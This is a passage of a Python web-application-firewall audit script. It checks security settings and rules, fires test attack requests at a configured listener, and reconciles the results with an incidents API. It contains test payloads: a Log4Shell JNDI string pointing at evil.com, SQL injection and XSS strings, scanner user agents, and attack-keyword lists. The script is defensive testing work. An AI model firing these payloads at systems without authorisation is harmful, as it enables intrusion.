        r.add_check("SSL DISABLED", ok=False, warn=True,
                    detail="Enable SSL to protect traffic in transit")

    # 2.5 Security headers
    subhdr("2.5 Security Headers")
    if info.hsts not in ("DISABLED", "UNKNOWN", "?", None):
        r.ok(f"HSTS: {info.hsts}")
        r.add_check(f"HSTS: {info.hsts}", ok=True)
    else:
        r.warn("HSTS DISABLED",
               "Enable HSTS in Security Profile → Policy → Web")
        r.add_check("HSTS disabled", ok=False, warn=True,
                    detail="HSTS should be enabled to prevent protocol downgrade attacks")

    if info.xframe not in ("DISABLED", "UNKNOWN", "?", None):
        r.ok(f"X-Frame-Options: {info.xframe}")
        r.add_check(f"X-Frame-Options: {info.xframe}", ok=True)
    else:
        r.warn("X-Frame-Options DISABLED — clickjacking risk",
               "Enable X-Frame-Options in Security Profile → Policy → Web")
        r.add_check("X-Frame-Options disabled", ok=False, warn=True,
                    detail="X-Frame-Options should be enabled to reduce clickjacking risk")

    if info.csrf_enabled:
        r.ok("CSRF protection ENABLED")
        r.add_check("CSRF protection ENABLED", ok=True)
    else:
        r.warn("CSRF protection DISABLED",
               "Enable CSRF in Security Profile → Policy → Web")
        r.add_check("CSRF protection DISABLED", ok=False, warn=True,
                    detail="Enable CSRF protection where available")

    # 2.6 Allowed HTTP methods
    subhdr("2.6 HTTP Methods Policy")
    dangerous = [m for m in info.allowed_methods if m in ("TRACE", "CONNECT", "DEBUG")]
    if dangerous:
        r.fail(f"Dangerous methods allowed: {dangerous}",
               f"Remove {dangerous} from allowed HTTP methods in Policy → Web")
    elif info.allowed_methods:
        r.ok(f"Allowed methods look safe: {info.allowed_methods}")
    else:
        r.warn("Could not read allowed HTTP methods")

    # 2.7 Host header check
    subhdr("2.7 Host Header Validation")
    if info.host_check:
        r.ok("Host header check ENABLED — blocks host injection")
    else:
        r.warn("Host header check DISABLED — host injection possible",
               "Enable Host Check in Listener → Settings → Operational")

    # 2.8 Bot protection
    subhdr("2.8 Bot Protection Settings")
    bot_items = [
        ("Bad Reputation Traffic", info.bot_bad_rep),
        ("TOR Traffic",            info.bot_tor),
        ("Proxy/VPN Traffic",      info.bot_proxy),
    ]
    for label, val in bot_items:
        if val not in ("NO_ACTION", "UNKNOWN"):
            r.ok(f"Bot — {label}: {val}")
        else:
            r.warn(f"Bot — {label}: NO_ACTION — recommend DROP",
                   f"Set Bot Protection → {label} to DROP")

    if info.bot_adv not in ("NONE", "UNKNOWN"):
        r.ok(f"Advanced bot protection: {info.bot_adv}")
    else:
        r.warn("Advanced bot protection: NONE",
               "Enable advanced bot protection (Security Profile → Bot Protection)")

    # 2.9 Antivirus
    subhdr("2.9 Antivirus / Malware Scanning")
    if info.av_mode not in ("DISABLE", "DISABLED", "UNKNOWN"):
        r.ok(f"Antivirus ENABLED — mode: {info.av_mode}")
    else:
        r.warn("Antivirus scanning DISABLED",
               "Enable Antivirus for file-upload endpoints (Security Profile → Antivirus)")

    # 2.10 Geo-IP
    subhdr("2.10 Geo-IP Filtering")
    if info.has_geo:
        r.ok(f"Geo-IP: {len(info.geo_countries)} blocked countries, "
             f"{len(info.geo_prefixes)} blocked IP prefixes")
    else:
        r.warn("No Geo-IP restrictions configured",
               "Consider Geo-IP filtering if your app serves a specific region only")

    # 2.11 Learning mode
    subhdr("2.11 Learning Mode")
    if info.learning_mode == "BYPASSED":
        r.ok("Learning mode BYPASSED — correct for production")
    elif info.learning_mode == "ACTIVE":
        r.warn("Learning mode ACTIVE — may reduce blocking accuracy in production",
               "Disable learning mode for production deployments")
    else:
        r.warn(f"Learning mode: {info.learning_mode}")

    # 2.12 Restricted extensions
    subhdr("2.12 Restricted File Extensions")
    must_have = {".bak", ".sql", ".config", ".log", ".key", ".pem", ".env"}
    current   = {f".{e}" for e in info.restricted_ext}
    missing   = must_have - current
    if not missing:
        r.ok(f"{len(info.restricted_ext)} file extensions restricted ✅")
    else:
        r.warn(f"Possibly missing high-risk extensions: {missing}",
               f"Add to restricted extensions in Policy → Web: {missing}")

    # Emit listener summary for UI
    try:
        info_payload = {
            "mode": getattr(info, 'mode', 'UNKNOWN'),
            "paranoia": getattr(info, 'paranoia', 'UNKNOWN'),
            "sig_on": getattr(info, 'sig_on', False),
            "ssl_enabled": getattr(info, 'ssl_enabled', False),
            "cipher_suite": getattr(info, 'cipher_suite', '?'),
            "backend": getattr(info, 'backend', '?'),
            "hsts": getattr(info, 'hsts', None),
            "av_mode": getattr(info, 'av_mode', None),
            "bot_bad_rep": getattr(info, 'bot_bad_rep', None),
            "has_geo": getattr(info, 'has_geo', False),
            "geo_countries": getattr(info, 'geo_countries', []),
        }
        emit_event('listener_info', **info_payload)
    except Exception:
        pass

    return r


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — RULES VALIDATION
#  v4 ENHANCEMENT: covers BOTH rule levels visible in the GUI screenshots:
#  Level 1: Listener → Settings → Rules (Image 1)
#  Level 2: Security Profile → Rules   (Image 3)
# ════════════════════════════════════════════════════════════════════════════

# Listener-level rule types (Image 1 — Settings → Rules dropdown)
LISTENER_RULES = {
    "FORWARDER":   ("Forwarder Rules",    False, "Route requests to different backends"),
    "UPSTREAM":    ("Upstream Rules",     False, "Override upstream server per-request"),
    "VARIABLE":    ("Variable Rules",     False, "Extract custom variables from requests"),
    "REDIRECTION": ("Redirection Rules",  False, "Redirect traffic — verify no unintended redirects"),
    "ERROR":       ("Error Page Rules",   True,  "Custom error responses — prevent server info disclosure"),
    "HEADER":      ("Header Rules",       False, "Add/remove/modify response headers"),
    "TRANSFORM":   ("Transform Rules",    False, "Rewrite request or response content"),
    "PAGE":        ("Page Rules",         False, "Serve static pages for specific conditions"),
    "CAPTURE_SSL": ("Capture SSL Rules",  False, "SSL traffic inspection"),
}

# Profile-level rule types (Image 3 — Security Profile → Rules dropdown)
PROFILE_RULES = {
    "FIREWALL":    ("Firewall Rules",      True,  "IP/CIDR blocking — essential for blocking known bad actors"),
    "LIMIT":       ("Rate Limit Rules",    True,  "Request throttling — prevents DDoS and brute force"),
    "WHITELIST":   ("Whitelist Rules",     False, "Bypass rules — ALWAYS verify these are intentional"),
    "FORM":        ("Form Rules",          False, "Validate form field values and structure"),
    "BEHAVIOR":    ("Behavior Rules",      False, "Anomaly/threshold based detection"),
    "CORRELATION": ("Correlation Rules",   False, "Multi-signal combined detection"),
    "DECEPTION":   ("Deception Rules",     False, "Honeypot traps for attackers"),
    "TAMPER":      ("Tamper Rules",        False, "Block or modify specific request patterns"),
    "SCRIPT":      ("Script Rules",        False, "Custom script-based rules"),
    "VALIDATION":  ("Validation Rules",    False, "Input validation beyond default policy"),
    "LOG":         ("Log Rules",           False, "Custom logging for specific patterns"),
    "RESPONSE":    ("Response Rules",      False, "Inspect and filter outbound responses"),
    "ERROR":       ("Profile Error Rules", False, "Profile-specific error handling"),
    "DEFACEMENT":  ("Defacement Rules",    False, "Website content integrity protection"),
    "LEARNING":    ("Learning Rules",      False, "Auto-learned rules from traffic patterns"),
    "PAGE":        ("Page Rules",          False, "Profile-specific page serving"),
}


def _get_rules_list(rule_data):
    """Extract rules list from a rule module dict regardless of structure."""
    if not rule_data:
        return []
    rules = rule_data.get("rules", rule_data.get("modules", []))
    if isinstance(rules, dict):
        rules = list(rules.values())
    return rules if isinstance(rules, list) else []


def phase3_rules(info: ListenerInfo, raw_listener: dict):
    hdr("PHASE 3 — RULES VALIDATION (Listener + Profile Level)")
    r = PhaseResult("Phase 3 — Rules Validation")

    # ── Level 1: Listener-level rules ───────────────────────────────────────
    # JSON path: raw_listener["modules"]["RULES"]["modules"]
    # These are the rules in Image 1 (Listener → Settings → Rules)
    subhdr("── LISTENER-LEVEL RULES (Settings → Rules) ──")
    log("INFO", "These rules run at listener level, before any profile evaluation")
    print()

    try:
        listener_rule_mod = raw_listener["modules"]["RULES"]["modules"]
        rows = []

        for key, (label, is_important, description) in LISTENER_RULES.items():
            rules = _get_rules_list(listener_rule_mod.get(key, {}))
            count = len(rules)

            if count > 0:
                rows.append([key, label, f"✅ {count}", ""])

                # Special handling per rule type
                if key == "REDIRECTION":
                    # Always flag these for review
                    r.warn(f"[LISTENER] {label}: {count} rule(s) — verify all are intentional",
                           f"Review {count} listener redirection rule(s)")
                    for rule in rules:
                        log("INFO", f"    → {rule.get('ruleName','?')}: "
                                    f"{rule.get('url','?')} "
                                    f"→ {rule.get('forwardLocation','?')} "
                                    f"({rule.get('responseCode','?')})")

                elif key == "HEADER":
                    r.ok(f"[LISTENER] {label}: {count} rule(s) — header manipulation active")
                    for rule in rules[:3]:
                        act = rule.get("action", {})
                        log("INFO", f"    → {rule.get('ruleName','?')}: {act.get('action','?')}")

                elif key == "ERROR":
                    r.ok(f"[LISTENER] {label}: {count} rule(s) — custom error pages configured")
                    for rule in rules[:3]:
                        log("INFO", f"    → {rule.get('ruleName','?')}: "
                                    f"codes={rule.get('codes','?')}")

                elif key == "FORWARDER":
                    r.ok(f"[LISTENER] {label}: {count} rule(s) — traffic routing configured")
                else:
                    r.ok(f"[LISTENER] {label}: {count} rule(s)")

            else:
                rows.append([key, label, "— None",
                             "⚠️  Recommended" if is_important else "optional"])
                if is_important:
                    r.warn(f"[LISTENER] {label}: not configured — {description}",
                           f"Listener: Add {label} — {description}")

        print(tabulate(rows,
                       headers=["Module", "Rule Type", "Count", "Note"],
                       tablefmt="simple"))
        print()

    except (KeyError, TypeError) as e:
        r.warn(f"Could not read listener-level rules: {e}")

    # ── Level 2: Security Profile rules ─────────────────────────────────────
    # JSON path: raw_listener["modules"]["PROFILES"]["<profile>"]["modules"]["RULES"]["modules"]
    # These are the rules in Image 3 (Security Profile → Rules dropdown)
    subhdr("── PROFILE-LEVEL RULES (Security Profiles → Rules) ──")
    log("INFO", "These rules run inside each security profile's evaluation engine")

    for pname, pdata in info.all_profiles.items():
        if not pdata:
            continue

        subhdr(f"  Profile: {pname}")
        try:
            profile_rule_mod = pdata["modules"]["RULES"]["modules"]
            rows = []
            critical_missing = []

            for key, (label, is_critical, description) in PROFILE_RULES.items():
                rules = _get_rules_list(profile_rule_mod.get(key, {}))
                count = len(rules)

                if count > 0:
                    rows.append([key, label, f"✅ {count}", ""])

                    if key == "WHITELIST":
                        # Whitelist rules always need a review warning
                        r.warn(f"[{pname}] {label}: {count} rule(s) — VERIFY each is intentional",
                               f"Profile '{pname}': {count} whitelist rule(s) — overly broad "
                               f"whitelists reduce WAF coverage, verify each one")
                        for rule in rules[:3]:
                            log("INFO", f"    Whitelist: {rule.get('ruleName','?')}")

                    elif key == "FIREWALL":
                        r.ok(f"[{pname}] {label}: {count} rule(s) — IP blocking active")
                        for rule in rules[:3]:
                            log("INFO", f"    Firewall: {rule.get('ruleName','?')} "
                                        f"→ {rule.get('action',{}).get('action','?')}")

                    elif key == "LIMIT":
                        r.ok(f"[{pname}] {label}: {count} rule(s) — rate limiting active")

                    elif key == "BEHAVIOR":
                        r.ok(f"[{pname}] {label}: {count} rule(s) — anomaly detection active")

                    elif key == "CORRELATION":
                        r.ok(f"[{pname}] {label}: {count} rule(s) — multi-signal detection active")

                    elif key == "DECEPTION":
                        r.ok(f"[{pname}] {label}: {count} honeypot rule(s) — attacker trapping active")

                    elif key == "DEFACEMENT":
                        r.ok(f"[{pname}] {label}: {count} rule(s) — content integrity monitoring active")

                    elif key == "RESPONSE":
                        r.ok(f"[{pname}] {label}: {count} rule(s) — outbound response filtering active")

                    else:
                        r.ok(f"[{pname}] {label}: {count} rule(s)")

                else:
                    note = "⚠️  Recommended" if is_critical else "optional"
                    rows.append([key, label, "— None", note])
                    if is_critical:
                        critical_missing.append(label)

            print()
            print(tabulate(rows,
                           headers=["Module", "Rule Type", "Count", "Note"],
                           tablefmt="simple"))
            print()

            for label in critical_missing:
                r.warn(f"[{pname}] No {label} — {PROFILE_RULES[next(k for k,v in PROFILE_RULES.items() if v[0]==label)][2]}",
                       f"Profile '{pname}': Configure {label}")

            # Also check non-Rules profile modules from Image 3's top nav
            _check_profile_non_rule_modules(pname, pdata, r)

        except (KeyError, TypeError) as e:
            r.warn(f"Could not read profile '{pname}' rules: {e}")

    return r


def _check_profile_non_rule_modules(pname, pdata, r):
    """
    Checks the module tabs visible in Image 3's top nav bar:
    Geo Filtering, Antivirus, Bot Protection, Token Validation, Policy, Signatures
    These live in pdata["modules"] directly, not under RULES.
    """
    mods = pdata.get("modules", {})

    # Bot protection per-profile
    bot = mods.get("BOT", {})
    if bot:
        adv = bot.get("advancedProtection", "NONE")
        bad = bot.get("badReputationTraffic", "NO_ACTION")
        if adv != "NONE":
            r.ok(f"[{pname}] Advanced bot protection: {adv}")
        if bad not in ("NO_ACTION", "UNKNOWN"):
            r.ok(f"[{pname}] Bot bad-rep action: {bad}")

    # JSON policy mode per-profile
    try:
        json_mode = mods["POLICY"]["modules"]["JSON"]["mode"]
        if json_mode == "STRICT":
            r.ok(f"[{pname}] JSON policy: STRICT mode ✅")
        else:
            r.warn(f"[{pname}] JSON policy mode: {json_mode} — STRICT recommended",
                   f"Profile '{pname}': Set JSON inspection to STRICT mode")
    except (KeyError, TypeError):
        pass

    # Geo-IP per-profile
    geo = mods.get("GEO_IP", {})
    if geo:
        countries = geo.get("blackListedCountries", [])
        prefixes  = geo.get("prefixBlacklist", [])
        if countries or prefixes:
            r.ok(f"[{pname}] Geo-IP: {len(countries)} countries + {len(prefixes)} prefixes blocked")


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — ATTACK SUITE
#  v4 ENHANCEMENT: uses new check_if_blocked() for accurate result types
# ════════════════════════════════════════════════════════════════════════════
def phase4_attacks(info: ListenerInfo):
    hdr("PHASE 4 — ATTACK PAYLOAD SUITE")
    r = PhaseResult("Phase 4 — Attack Suite")

    scheme   = "https" if CONFIG["use_https_traffic"] else "http"
    base_url = f"{scheme}://{CONFIG['miti_ip']}"
    host     = CONFIG["target_listener"]

    log("INFO", f"Target URL   : {base_url}")
    log("INFO", f"Host header  : {host}")
    log("INFO", f"Total payloads: {len(ATTACK_PAYLOADS)}")
    log("INFO", "Result types: BLOCKED=403, REDIRECTED=302→WAF page, DROPPED=connection reset")
    print()

    attack_results = []

    for (tid, cat, desc, path, payload) in ATTACK_PAYLOADS:
        ua   = BOT_UA.get(tid, "Mozilla/5.0 (WAFAutoTest/4.0)")
        hdrs = {
            "Host":         host,
            "User-Agent":   ua,
            "X-WAF-Test-ID": tid,
        }

        # Special payloads that need extra headers
        if tid == "HTTP-01":
            hdrs["X-Long-Header"] = "A" * 8192

        if tid == "OWASP-05":
            # Log4Shell — sent via header, not URL
            hdrs["X-Api-Version"] = "${jndi:ldap://evil.com/exploit}"
            hdrs["User-Agent"]    = "${jndi:ldap://evil.com/exploit}"

        # HTTP-03 uses a very long URL path
        actual_path = path
        actual_payload = payload
        if tid == "HTTP-03":
            actual_path    = "/?q=" + "A" * 4000
            actual_payload = ""

        # Fire the request
        resp_obj = None
        try:
            resp_obj = requests.get(
                f"{base_url}{actual_path}{actual_payload}",
                headers=hdrs,
                timeout=6,
                verify=False,
                allow_redirects=False,  # IMPORTANT: don't follow redirects — we check Location
            )
            status  = resp_obj.status_code
            elapsed = resp_obj.elapsed.total_seconds()

        except requests.exceptions.ConnectionError:
            # Connection reset / refused — often the WAF dropping the connection
            status, elapsed = "CONN_ERR", 0
        except requests.exceptions.Timeout:
            status, elapsed = "TIMEOUT", 0
        except Exception:
            status, elapsed = "ERR", 0

        # v4: use the new accurate block detection
        is_blocked, result_type = check_if_blocked(status, resp_obj)

        attack_results.append({
            "id":       tid,
            "category": cat,
            "desc":     desc,
            "payload":  (actual_path + str(actual_payload))[:50],
            "status":   status,
            "result":   result_type,
            "blocked":  is_blocked,
            "elapsed":  f"{elapsed:.2f}s",
            "reconciled": False,
        })

        emit_event(
            "attack_result",
            id=tid,
            category=cat,
            desc=desc,
            status=status,
            result=result_type,
            blocked=is_blocked,
            progress=round((len(attack_results) / len(ATTACK_PAYLOADS)) * 100, 1),
            index=len(attack_results),
            total=len(ATTACK_PAYLOADS),
        )

        if is_blocked:
            r.passed += 1
        else:
            r.failed += 1
            r.findings.append(
                f"[MISSED] {tid} — {desc} — payload: {(actual_path + str(actual_payload))[:40]}"
            )

        # Color + icon based on result type
        if result_type == "BLOCKED":
            color, icon = C.PASS, "✅"
        elif result_type == "REDIRECTED":
            color, icon = C.PASS, "↩️ "
        elif result_type == "DROPPED":
            color, icon = C.PASS, "🚫"
        else:
            color, icon = C.FAIL, "❌"

        print(f"{color}  {icon} [{tid}] {desc[:38]:<38} → "
              f"{str(status):<10} → {result_type}{C.R}")

        time.sleep(ATTACK_DELAY)

    # Category breakdown
    print()
    cats = {}
    for ar in attack_results:
        c = ar["category"]
        cats.setdefault(c, {"t": 0, "b": 0})
        cats[c]["t"] += 1
        if ar["blocked"]:
            cats[c]["b"] += 1

    cat_rows = [
        [c, d["t"], d["b"], d["t"] - d["b"], f"{(d['b']/d['t']*100):.0f}%"]
        for c, d in cats.items()
    ]
    print(tabulate(cat_rows,
                   headers=["Category", "Total", "Blocked", "Missed", "Detection %"],
                   tablefmt="simple"))
    print()

    return r, attack_results


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — FEATURE TESTS  (same as v3, uses new check_if_blocked)
# ════════════════════════════════════════════════════════════════════════════
def phase5_features(info: ListenerInfo):
    hdr("PHASE 5 — FEATURE-SPECIFIC TESTS")
    r = PhaseResult("Phase 5 — Feature Tests")

    scheme   = "https" if CONFIG["use_https_traffic"] else "http"
    base_url = f"{scheme}://{CONFIG['miti_ip']}"
    host     = CONFIG["target_listener"]

    def req(path="/", method="GET", ua=None, extra_hdrs=None, data=None, json_body=None):
        hdrs = {"Host": host, "User-Agent": ua or "Mozilla/5.0 (WAFFeatureTest/4.0)"}
        if extra_hdrs:
            hdrs.update(extra_hdrs)
        try:
            fn   = getattr(requests, method.lower())
            resp = fn(f"{base_url}{path}", headers=hdrs, data=data, json=json_body,
                    timeout=6, verify=False, allow_redirects=False)
            return resp.status_code, resp.elapsed.total_seconds(), resp
        except requests.exceptions.ConnectionError:
            return "CONN_ERR", 0, None          # ← ADD THIS
        except requests.exceptions.Timeout:
            return "TIMEOUT", 0, None           # ← ADD THIS
        except Exception:
            return "ERR", 0, None

    # 5.1 False positive check — normal traffic must NOT be blocked
    subhdr("5.1 Normal Traffic (False Positive Check)")
    s, _, resp = req("/")
    is_b, rt   = check_if_blocked(s, resp)
    if not is_b:
        r.ok(f"Normal GET / returns {s} — not falsely blocked ✅")
    else:
        r.fail(f"Normal GET / shows {rt} ({s}) — FALSE POSITIVE!",
               "Normal legitimate traffic is being blocked — review WAF rules")

    # 5.2 Rate limiting
    subhdr("5.2 Rate Limiting (50 rapid requests)")
    throttled = 0
    for _ in range(50):
        s2, _, r2 = req("/")
        is_b2, _  = check_if_blocked(s2, r2)
        if is_b2:
            throttled += 1
    if throttled > 0:
        r.ok(f"Rate limiting active — {throttled}/50 rapid requests were throttled ✅")
    else:
        r.warn("No rate limiting detected after 50 rapid requests",
               "Configure Rate Limit Rules in Security Profile → Rules → Rate Limit Rules")

    # 5.3 Scanner/Bot UA detection
    subhdr("5.3 Scanner / Bot User-Agent Detection")
    scanner_uas = [
        ("sqlmap",  "sqlmap/1.0-dev (https://sqlmap.org)"),
        ("nikto",   "Nikto/2.1.6"),
        ("nmap",    "Nmap Scripting Engine; NSE/7.94"),
        ("masscan", "masscan/1.0 tbot/1.0"),
    ]
    for name, ua in scanner_uas:
        s, _, resp = req("/", ua=ua)
        is_b, rt   = check_if_blocked(s, resp)
        if is_b:
            r.ok(f"Scanner blocked: {name} UA → {rt} ({s}) ✅")
        else:
            r.warn(f"Scanner NOT blocked: {name} UA → {s}",
                   f"Bot UA '{name}' not blocked — configure Bot Protection rules")

    # 5.4 POST body SQLi
    subhdr("5.4 SQL Injection in POST Body")
    s, _, resp = req("/login", method="POST",
                     extra_hdrs={"Content-Type": "application/x-www-form-urlencoded"},
                     data="username=admin' OR '1'='1&password=test")
    is_b, rt   = check_if_blocked(s, resp)
    if is_b:
        r.ok(f"POST body SQLi blocked → {rt} ({s}) ✅")
    else:
        r.fail(f"POST body SQLi NOT blocked → {s}",
               "SQL injection in POST body not blocked — verify POST body inspection is on")

    # 5.5 POST body XSS
    subhdr("5.5 XSS in POST Body")
    s, _, resp = req("/search", method="POST",
                     extra_hdrs={"Content-Type": "application/x-www-form-urlencoded"},
                     data="query=<script>alert(1)</script>")
    is_b, rt   = check_if_blocked(s, resp)
    if is_b:
        r.ok(f"POST body XSS blocked → {rt} ({s}) ✅")
    else:
        r.fail(f"POST body XSS NOT blocked → {s}",
               "XSS in POST body not blocked — verify signature detection is enabled")

    # 5.6 JSON body injection
    subhdr("5.6 SQL Injection in JSON Body")
    s, _, resp = req("/api/login", method="POST",
                     extra_hdrs={"Content-Type": "application/json"},
                     json_body={"username": "admin' OR '1'='1", "password": "x"})
    is_b, rt   = check_if_blocked(s, resp)
    if is_b:
        r.ok(f"JSON body SQLi blocked → {rt} ({s}) ✅")
    else:
        r.warn(f"JSON body SQLi not blocked ({s}) — check JSON inspection mode",
               "Enable JSON inspection STRICT mode in Security Profile → Policy → JSON")

    # 5.7 TRACE method
    subhdr("5.7 TRACE Method (XST risk)")
    try:
        resp = requests.request("TRACE", f"{base_url}/",
                                headers={"Host": host}, timeout=6,
                                verify=False, allow_redirects=False)
        s = resp.status_code
    except:
        s, resp = "ERR", None
    is_b, rt = check_if_blocked(s, resp)
    if is_b:
        r.ok(f"TRACE method blocked → {rt} ({s}) ✅")
    else:
        r.warn(f"TRACE method not blocked → {s}",
               "Add TRACE to blocked methods in Policy → Web → Allowed HTTP Methods")

    # 5.8 SSL test
    subhdr("5.8 SSL/TLS Connectivity Test")
    if info.ssl_enabled:
        try:
            resp = requests.get(f"https://{CONFIG['miti_ip']}/",
                                headers={"Host": host}, verify=False, timeout=6,
                                allow_redirects=False)
            r.ok(f"HTTPS connection successful → {resp.status_code} ✅")
        except Exception as e:
            r.fail(f"HTTPS connection failed: {e}",
                   "SSL is enabled but HTTPS connections are failing")
    else:
        r.skip("SSL disabled on this listener — skipping HTTPS test")

    # 5.9 Geo-IP spoofed IP test
    subhdr("5.9 Geo-IP Filtering (X-Forwarded-For spoof)")
    if info.has_geo:
        s, _, resp = req("/", extra_hdrs={"X-Forwarded-For": "175.45.176.1"})  # N. Korea IP
        is_b, rt   = check_if_blocked(s, resp)
        if is_b:
            r.ok(f"Geo-IP blocking active — spoofed restricted IP blocked → {rt} ({s}) ✅")
        else:
            r.warn("Spoofed restricted-country IP not blocked — check Geo-IP rules",
                   "Geo-IP rules exist but X-Forwarded-For based geo blocking may not be active")
    else:
        r.skip("No Geo-IP rules configured — skipping Geo-IP test")

    return r


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — INCIDENT VERIFICATION + RECONCILIATION
#  v4 ENHANCEMENT: reconciles attack results against incidents API
#  If our script shows PASSED_THROUGH but incidents shows it was blocked,
#  we correct the result — incidents API is ground truth
# ════════════════════════════════════════════════════════════════════════════
def phase6_incidents(api: HaltdosAPI, info: ListenerInfo, attack_results: list):
    hdr("PHASE 6 — INCIDENT VERIFICATION + RECONCILIATION")
    r = PhaseResult("Phase 6 — Incident Verify")

    subhdr("6.1 Fetching Incidents (last 60 min)")
    data, err = api.get_incidents(ref_id=info.listener_id, limit=200, minutes_back=60)

    # If listener-specific fetch fails, try without filter
    if err:
        r.warn(f"Could not fetch incidents with listener filter: {err}")
        log("INFO", "Retrying without referenceId filter...")
        data, err = api.get_incidents(limit=200, minutes_back=60)
        if err:
            r.fail(f"Incidents API failed: {err}",
                   "Cannot fetch incidents — verify API token has READ access on /v1/stack/.../incidents")
            return r

    r.ok(f"Incidents API responding — GET /v1/stack/{CONFIG['stack_id']}/incidents")

    try:
        incidents = data.get("data", [])
        if not isinstance(incidents, list):
            incidents = []
        meta  = data.get("metadata", {})
        total = meta.get("total", len(incidents))
        r.incidents = incidents

        log("INFO", f"Total incidents in last 60 min: {total}")

        if not incidents:
            r.warn("No incidents found in last 60 min",
                   "No incidents — either WAF is in RECORD mode or tests ran too long ago")
            r.add_check("No incidents found", ok=False, warn=True,
                        detail="No incidents were returned from the API in the last hour")
            return r

        r.ok(f"{total} incident(s) found in the last hour")
        r.add_check(f"{total} incident(s) found in last 60 min", ok=True)

        # Show sample table
        subhdr("6.2 Recent Incidents (last 10)")
        rows = []
        for inc in incidents[:10]:
            rows.append([
                str(inc.get("startTime", "?"))[:13],
                inc.get("sourceIp") or inc.get("srcIp") or inc.get("source", "?"),
                inc.get("category") or inc.get("type", "?"),
                inc.get("subCategory") or inc.get("subType") or inc.get("ruleName", "?"),
                inc.get("action") or inc.get("disposition", "?"),
                str(inc.get("message") or inc.get("description") or inc.get("msg", "?"))[:35],
            ])
        print()
        print(tabulate(rows,
                       headers=["Time(ms)", "Source IP", "Category", "Sub-Cat", "Action", "Message"],
                       tablefmt="simple"))
        print()

        # 6.3 Action distribution
        subhdr("6.3 Action Distribution")
        actions = {}
        for inc in incidents:
            a = inc.get("action", "UNKNOWN")
            actions[a] = actions.get(a, 0) + 1
        for action, count in sorted(actions.items(), key=lambda x: -x[1]):
            log("INFO", f"  {action:<20}: {count} incident(s)")
        if "DROP" in actions or "BLOCK" in actions:
            r.ok("WAF is actively BLOCKING (DROP/BLOCK actions confirmed in incidents) ✅")
        elif "RECORD" in actions:
            r.warn("WAF is only RECORDING — not blocking attacks",
                   "All incident actions are RECORD — switch WAF mode to MITIGATION")

        # 6.4 RECONCILIATION — this is the key v4 addition
        # Our script sometimes shows PASSED_THROUGH when the WAF actually blocked
        # via a mechanism our HTTP check didn't catch (e.g. server-side drop after
        # response was partially sent, or async blocking). Incidents API is ground truth.
        subhdr("6.4 Reconciliation — Script Results vs Incidents API")
        log("INFO", "Checking if any PASSED_THROUGH attacks actually appear in the incidents log...")

        if attack_results:
            # Build a searchable corpus from incident messages + categories
            incident_corpus = " ".join([
                str(inc.get("message", "")).lower() +
                str(inc.get("category", "")).lower() +
                str(inc.get("subCategory", "")).lower() +
                str(inc.get("uri", "")).lower()
                for inc in incidents
            ])

            # Keyword map: attack id → keywords to search in incident corpus
            keyword_map = {
                "SQLi": ["sql", "injection", "union", "sleep", "waitfor", "extractvalue"],
                "XSS":  ["xss", "cross-site", "script", "onerror", "onload"],
                "PT":   ["traversal", "path", "etc/passwd", "directory"],
                "CI":   ["command", "injection", "rce", "exec"],
                "LFI":  ["lfi", "file inclusion", "php://", "wrapper"],
                "SFA":  ["sensitive", ".env", "config", "backup"],
                "BOT":  ["bot", "scanner", "sqlmap", "nikto", "crawler"],
                "HTTP": ["header", "oversized", "null byte", "malformed"],
                "OWASP":["xxe", "ssrf", "ssti", "log4", "crlf", "redirect"],
            }

            reconciled_count = 0
            for ar in attack_results:
                if ar["result"] == "PASSED_THROUGH":
                    # Find which keyword group this test ID belongs to
                    prefix = ar["id"].split("-")[0]
                    keywords = keyword_map.get(prefix, [ar["desc"].lower().split()[0]])

                    # Check if any keyword appears in the incidents corpus
                    if any(kw in incident_corpus for kw in keywords):
                        ar["result"]      = "PASSED_THROUGH*"
                        ar["reconciled"]  = True
                        reconciled_count += 1

            if reconciled_count > 0:
                r.warn(
                    f"{reconciled_count} attack(s) marked PASSED_THROUGH* — "
                    f"appeared in incidents (WAF may have blocked them via mechanism "
                    f"not visible in HTTP status code)",
                    f"{reconciled_count} result(s) need manual review — "
                    f"check incidents panel for: " +
                    ", ".join(ar["id"] for ar in attack_results if ar.get("reconciled"))
                )
                log("INFO", "Attacks with * may have been blocked — verify in the GUI:")
                for ar in attack_results:
                    if ar.get("reconciled"):
                        log("INFO", f"  → {ar['id']} — {ar['desc']}")
            else:
                r.ok("No reconciliation discrepancies — script results match incident log ✅")

        # 6.5 IoC list
        subhdr("6.5 Indicators of Compromise (IoC)")
        ioc_data, ioc_err = api.get_ioc_list(minutes_back=60)
        if ioc_data and ioc_data.get("data"):
            ioc_list = ioc_data["data"]
            r.ok(f"IoC list: {len(ioc_list)} malicious source IP(s) identified in last 60 min")
            for ioc in ioc_list[:5]:
                log("INFO", f"  Malicious IP: {ioc.get('sourceIp','?')} — "
                            f"events: {ioc.get('count','?')}")
        else:
            r.warn(f"IoC list empty or unavailable: {ioc_err}")

    except Exception as e:
        r.warn(f"Could not fully process incident data: {e}")

    # Emit incidents summary for UI
    try:
        ioc_count = 0
        try:
            ioc_count = len(ioc_list) if 'ioc_list' in locals() and isinstance(ioc_list, list) else 0
        except Exception:
            ioc_count = 0
        emit_event('incidents_data', incidents=incidents if 'incidents' in locals() else [], ioc_count=ioc_count)
    except Exception:
        pass

    return r


# ════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — FINAL REPORT  (enhanced from v3 — shows new result types)
# ════════════════════════════════════════════════════════════════════════════
def phase7_report(phase_results: list, attack_results: list, info, report_name=None):
    hdr("PHASE 7 — FINAL REPORT", char="█")

    total_checks  = sum(p.passed + p.failed for p in phase_results)  # exclude skipped/warn
    total_passed  = sum(p.passed for p in phase_results)
    score = (total_passed / total_checks * 100) if total_checks else 0

    if score >= 85:
        score_color, verdict = C.PASS, "✅ PRODUCTION READY"
    elif score >= 65:
        score_color, verdict = C.WARN, "⚠️  NEEDS IMPROVEMENT"
    else:
        score_color, verdict = C.FAIL, "❌ NOT PRODUCTION READY"

    print(f"""
{C.BOLD}  Setup Type        : {SETUP_TYPE.upper()}
  Stack ID           : {CONFIG['stack_id']}
  Management IP      : {CONFIG['mgmt_ip']}:{CONFIG['mgmt_port']}
  Traffic IP         : {CONFIG['miti_ip']}
  Target Listener    : {CONFIG['target_listener']}
  Test Completed At  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{C.R}""")

